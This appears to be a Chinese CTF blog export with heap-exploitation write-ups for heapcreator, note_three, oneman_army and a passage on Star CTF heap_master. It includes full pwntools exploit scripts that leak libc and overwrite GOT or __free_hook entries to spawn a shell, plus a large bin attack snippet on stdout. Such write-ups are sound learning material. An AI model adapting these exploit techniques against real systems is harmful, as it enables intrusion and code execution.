<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序一共有几个功能，分别是新建chunk，编辑chunk，打印chunk的大小和内容，删除chunk。一般来说有输出函数可以利用其泄露Libc地址等</p>
<p><img src="/2020/09/03/heapcreator/1.jpg" alt="main"></p>
<p>create函数里使用一个全局变量heaparray存储node，heaparray[i]表示第i个node，每个Node为固定分配0x10大小的结构体，结构体第一个成员为size，第二个成员为addr，用来表示被分配的chunk的大小和地址。这里注意是先写入Node的值再获取chunk的内容，且Node的分配在chunk前。</p>
<p><img src="/2020/09/03/heapcreator/2.jpg" alt="create"></p>
<p>show函数输出分配chunk的大小和地址，输出前判断heaparray所在位置的值是否为空，由于被删除chunk的node也会被清空，因此这个避免了输出free之后chunk的内容</p>
<p><img src="/2020/09/03/heapcreator/3.jpg" alt="show"></p>
<p>edit函数存在null-byte-one漏洞，可以多写入一个字节</p>
<p><img src="/2020/09/03/heapcreator/4.jpg" alt="edit"></p>
<p>delete函数删除heap</p>
<p><img src="/2020/09/03/heapcreator/5.jpg" alt="delete"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>程序比较大的问题就是这个null-byte-one。我们之前学过chunk的使用存在空间复用，对于按次序分配的chunk1和chunk2，如果chunk1是分配过的chunk，那么chunk2的size部分可以表明chunk1已经被分配，故其free的时候不需要考虑和chunk1的合并，因此chunk2的prev_size成员没有意义，故这部分空间被chunk1使用，也就是说如果我们可以多写入一个字节的话实际上我们可以修改chunk2的size的最后一个字节，之前的写入’\x00’从而unlink就是利用这个原理</p>
<p>具体而言，我们先create两个chunk，第一个size为0x18，第二个为0x10这时程序的地址情况如下图所示，0x603000和0x603040为node地址，0x603030和0x603070是chunk的内容地址。<br>正常来说，由于对齐，0x18+0x10的head应该会得到大小为0x30的chunk，但是由于之前说的空间复用，0x20的chunk即可满足0x18内容要求。</p>
<p><img src="/2020/09/03/heapcreator/6.jpg" alt="array"></p>
<p><img src="/2020/09/03/heapcreator/7.jpg" alt="heap"></p>
<p><img src="/2020/09/03/heapcreator/8.jpg" alt="heaps"></p>
<p>使用edit我们可以覆盖掉node的头部的size的部分，现在考虑一下我们的需求，首先是泄露libc地址，这个地址如果考虑利用show泄露的话，我们需要在node的内容里填上用过的函数地址，但是node的内容是malloc得到的地址，我们之前用过doubel free修改被释放空闲块的fd的方式诱使分配我们构造的fake chunk，这里不存在这样的利用机会，需要换个思路，如先malloc正常的地址，但是我们使用edit函数修改node的值，这就是chunk extend的目的。<br>具体地，我们按开始的方式edit(chunk0)来修改node1的size为0x41，之后free(chunk1)。create()开始的malloc的node大小为0x20，而刚刚free的chunk1的大小也是0x20，因此新的node1实际上为之前free的chunk1，再malloc(30)的时候，由于我们修改了前面的size，这次malloc的chunk1就是之前释放的node1，但是不巧的是这里的新chunk1大小为0x41,已经可以覆写新node1，我们修改Node1的内容为free@got，泄露地址，再edit将free@got改成system@plt，把chunk0的内容预先设置为’/bin/sh\x00’，free(chunk0)即可调用system(‘/bin/sh’)</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content of heap:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content of heap : '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## leak libc</span></span><br><span class="line">Create(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">4</span>)<span class="comment">#idx0</span></span><br><span class="line">Create(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">4</span>)<span class="comment">#idx1</span></span><br><span class="line">Edit(<span class="number">0</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'\x41'</span>)<span class="comment">#hack the size</span></span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">Create(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got))</span><br><span class="line">Show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">free_addr = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="comment">## get shell</span></span><br><span class="line">Edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line"><span class="comment">## trigger </span></span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Hitcon-Training</category>
      </categories>
  </entry>
  <entry>
    <title>黄鹤杯CTF</title>
    <url>/2020/09/03/hhb/</url>
    <content><![CDATA[<h1 id="武汉黄鹤杯CTF"><a href="#武汉黄鹤杯CTF" class="headerlink" title="武汉黄鹤杯CTF"></a>武汉黄鹤杯CTF</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>错失巨款的比赛，心痛max。一共有两道pwn，pwn1的unsorted bin attack自己做的时候发现后面不太行，看ym学长的exp又学了一波正经的ub attack</p>
<h2 id="note-three"><a href="#note-three" class="headerlink" title="note_three"></a>note_three</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>程序没开PIE，是partial RELOAD，程序只有New和Edit，New先让用户输入size，之后用户在0x6020c0处输入content，再使用strdup去分配堆块，注意这里是根据用户输入content长度去分配的，因此在Edit的时候会有堆溢出。</p>
<p>用这个堆溢出我们可以修改top_chunk的size，之后malloc大于其size的块拿到unsorted bin，之后用ub attack把heap_lis[0]改成main_arena+88(unsorted_chunk(av))，这个对应的是top_chunk，改成atoi_got-0x10，同时last_remainder改为0，为了避免Unsorted bin分配时候的检查出错，还要把其fd和bk改成一个fake_chunk的地址，这里直接在bss里构造一个fake_chunk。由于unsorted bin是按照bk寻找chunk的，因此后面从main_arena+88开始，先找到0x602130，再根据其bk0x6021b0作为寻找的最终chunk，总之这个链经过构造在分配过程中没有用非法地址，因此不会报错。</p>
<p>分配到aoti之后Edit改成printf，用%p泄露libc地址，再修改atoi到system拿shell。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = read_int();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">    result = input_number();</span><br><span class="line">    v2 = result;</span><br><span class="line">    <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">0x90</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)&amp;byte_6020C0[<span class="number">16</span> * v1 + <span class="number">0x100</span>] = MyMalloc(result);</span><br><span class="line">      result = v2;</span><br><span class="line">      *(_QWORD *)&amp;byte_6020C0[<span class="number">16</span> * v1 + <span class="number">0x108</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">MyMalloc</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(byte_6020C0, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"content: "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input(byte_6020C0, size);</span><br><span class="line">  <span class="keyword">return</span> strdup(byte_6020C0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = read_int();                          <span class="comment">// idx没有检查</span></span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_QWORD *)&amp;byte_6020C0[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)result + <span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"content: "</span>);</span><br><span class="line">      result = get_input(*(<span class="keyword">void</span> **)&amp;byte_6020C0[<span class="number">16</span> * v1 + <span class="number">0x100</span>], *(_QWORD *)&amp;byte_6020C0[<span class="number">16</span> * v1 + <span class="number">0x108</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/03/hhb/1.jpg" alt="fake"></p>
<p><img src="/2020/09/03/hhb/2.jpg" alt="fake_chunk"></p>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./note_three'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./note_three'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x400a97')</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">23</span>):</span><br><span class="line">        New(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">"0"</span>*<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">    New(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">"0"</span>)<span class="comment">#0</span></span><br><span class="line">    New(<span class="number">1</span>,<span class="number">0x88</span>,<span class="string">"1"</span>*<span class="number">0x80</span>)<span class="comment">#1 0x90</span></span><br><span class="line">    New(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">'a'</span>*<span class="number">0x30</span>)<span class="comment">#2</span></span><br><span class="line">    Edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>))</span><br><span class="line"></span><br><span class="line">    New(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">"0"</span>*<span class="number">0x90</span>)</span><br><span class="line">    <span class="comment">#ub</span></span><br><span class="line">    New(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">"a"</span>)<span class="comment">#0</span></span><br><span class="line">    heap_lis = <span class="number">0x6020c0</span>+<span class="number">0x100</span></span><br><span class="line">    Edit(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)+p64(heap_lis<span class="number">-0x10</span>))</span><br><span class="line">    New(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">    <span class="comment">#fake top</span></span><br><span class="line">    Edit(<span class="number">0</span>,p64(<span class="number">0x602048</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x6020c0</span>+<span class="number">0x70</span>)*<span class="number">2</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    New(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">'a'</span>*<span class="number">0x78</span>+p64(<span class="number">0x91</span>)+p64(<span class="number">0x6021b0</span>)*<span class="number">2</span>)</span><br><span class="line">    atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">    Edit(<span class="number">2</span>,payload)</span><br><span class="line">    printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">    <span class="comment">#New(1,0x78,"a"*0x78)</span></span><br><span class="line">    Edit(<span class="number">0</span>,p64(atoi_got)+p64(<span class="number">0x100</span>)+p64(atoi_got))</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">1</span>,p64(printf_plt))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"%19$p"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    libc_base = int(p.recvline().strip(<span class="string">"\n"</span>),<span class="number">16</span>) - <span class="number">240</span> - libc.sym[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    p.sendline(p64(libc_base+libc.sym[<span class="string">"system"</span>]))</span><br><span class="line">    p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>程序里有个Magic函数可以堆溢出，先House-of-orange8次拿到ub，之后tcache dup即可</p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./oneman_army'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./oneman_army'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Magic</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">    p.sendline(str(<span class="number">0x2333</span>))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">23</span>):</span><br><span class="line">        Alloc(<span class="number">0x88</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">    Magic(<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xc1</span>))</span><br><span class="line">    Alloc(<span class="number">0xa0</span>,<span class="string">'a'</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">54</span>):</span><br><span class="line">            Alloc(<span class="number">0x88</span>,<span class="string">'a'</span>)</span><br><span class="line">        Alloc(<span class="number">0x20</span>,<span class="string">'a'</span>)</span><br><span class="line">        Magic(<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xc1</span>))</span><br><span class="line">        Alloc(<span class="number">0xa0</span>,<span class="string">'a'</span>)</span><br><span class="line">    <span class="comment">#get ub</span></span><br><span class="line">    Alloc(<span class="number">0x28</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">    Show()</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3ebd30</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    free_hook = libc_base + libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">    Free()</span><br><span class="line">    Alloc(<span class="number">0x68</span>,<span class="string">'a'</span>)</span><br><span class="line">    Free()</span><br><span class="line">    <span class="comment">#overflow</span></span><br><span class="line">    Alloc(<span class="number">0x28</span>,<span class="string">'a'</span>)</span><br><span class="line">    Magic(<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(free_hook))</span><br><span class="line">    Alloc(<span class="number">0x68</span>,<span class="string">'a'</span>)</span><br><span class="line">    Alloc(<span class="number">0x68</span>,p64(system_addr))</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    Alloc(<span class="number">0x20</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    Free()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>黄鹤杯CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Star CTF heap_master</title>
    <url>/2020/09/03/heap_master/</url>
    <content><![CDATA[<h1 id="Star-CTF-heap-master"><a href="#Star-CTF-heap-master" class="headerlink" title="Star CTF heap_master"></a>Star CTF heap_master</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>需要做下大型比赛的题目，包括0CTF/<em>CTF/Balsn CTF等比赛的题，这里先从2019年的</em>CTF开始。这道题主要参考<a href="https://xiaoxiaorenwu.top/2019/07/05/5%E7%A7%8D%E6%96%B9%E6%B3%95%E8%A7%A3heap_master/" target="_blank" rel="noopener">xiaoxiaorenwu</a>的博客，堆的利用确实精彩，这是期末考试前的最后一篇博客(再不复习就要挂了)</p>
<h2 id="heap-master"><a href="#heap-master" class="headerlink" title="heap_master"></a>heap_master</h2><h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>程序有仨功能，Malloc/Edit/Free。Malloc分配指定size的块，Edit可以在一块事先分好的随机map处的区域任意编辑，Free释放这块区域内指定位置的chunk。  </p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用Edit在map的地址伪造chunk，之后可以释放，分配的size没有限制，可以极大，开始想能用上hitcon那道题map地址同libc地址差值固定，但是没法Edit输入，目测没什么好的利用思路。最后stuck之后查了xxrw和e3pem的博客，花了一天调试，感觉收获了巨多干货。下面从泄露和get shell分别介绍一下。  </p>
<h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>程序里用printf和puts(仅用write是没办法从stdout泄露的)，我们通过修改文件结构体来泄露。  </p>
<h4 id="large-bin-attack修改stdout"><a href="#large-bin-attack修改stdout" class="headerlink" title="large bin attack修改stdout"></a>large bin attack修改stdout</h4><p>之前红帽的比赛中看到陆晨学长用了这个攻击方式，自己也试了一下，能做到的效果是往任意两个地址里写victim_addr(链表插入中使用到的unsorted bin地址)。一般构造方式如下：<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Malloc(<span class="number">0x320</span>)<span class="comment">#0</span></span><br><span class="line">Malloc(<span class="number">0x410</span>)<span class="comment">#1</span></span><br><span class="line">Malloc(<span class="number">0x20</span>)</span><br><span class="line">Malloc(<span class="number">0x420</span>)<span class="comment">#3</span></span><br><span class="line">Malloc(<span class="number">0x20</span>)</span><br><span class="line">Malloc(<span class="number">0x430</span>)<span class="comment">#5</span></span><br><span class="line">Free(<span class="number">0</span>)</span><br><span class="line">Free(<span class="number">1</span>)</span><br><span class="line">Malloc(<span class="number">0x90</span>)<span class="comment"># put 0 to ub &amp; 1 to large bin</span></span><br><span class="line"></span><br><span class="line">Free(<span class="number">3</span>)<span class="comment"># now put 3 to ub , now 1 still in large bin</span></span><br><span class="line"></span><br><span class="line">Edit(chunk2+<span class="number">0x8</span>,<span class="number">0x3f1</span>)</span><br><span class="line">Edit(chunk2+<span class="number">0x10</span>,<span class="number">0</span>)</span><br><span class="line">Edit(chunk2+<span class="number">0x18</span>,addr1<span class="number">-0x10</span>)</span><br><span class="line">Edit(chunk2+<span class="number">0x20</span>,<span class="number">0</span>)</span><br><span class="line">Edit(chunk2+<span class="number">0x28</span>,addr2<span class="number">-0x20</span>)</span><br><span class="line"></span><br><span class="line">Malloc(<span class="number">0x90</span>)<span class="comment">#trigger inserting to large bin</span></span><br></pre></td></tr></table></figure></p>
<p>首先我们确定一下这里的chunk2，其fd、bk、fd_nextsize、bk_nextsize构造出main_arena+n(libc相关)(方法是通过构造两个small bin之后释放，Edit原ub的size复原释放，再部分写bk和bk_nextsize为stdout_addr-0x10和stdout_addr+0x19-0x20错位写write_ptr最低一字节和write_base的7字节)，需要满足的条件是<code>_flags &amp; 0x1a00 != 0</code>以及<code>_IO_write_base != _IO_write_ptr</code>，因为我们写入的是<code>victim_addr</code>，所以只需要满足<code>victim_addr &amp; 0x1a00 != 0</code>，我们知道map的地址最低三字节为000，所以a00这个可以通过构造map地址实现，而0x1000这个通过map地址的随机性实现，最终可以成功修改_IO_2_1_stdout，泄露libc地址和map地址。  </p>
